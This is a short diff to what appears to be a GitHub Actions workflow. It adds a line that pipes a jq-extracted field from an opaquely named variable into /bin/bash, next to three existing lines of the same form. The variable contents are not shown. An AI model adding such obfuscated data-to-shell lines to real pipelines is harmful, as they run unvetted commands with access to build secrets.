@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$byuj02" | jq -r .qb05 | /bin/bash
           printf '%s' "$lzch945" | jq -r .c460 | /bin/bash
           printf '%s' "$d56" | jq -r .wacer10 | /bin/bash
+          printf '%s' "$rxfu67" | jq -r .eqlai1818 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
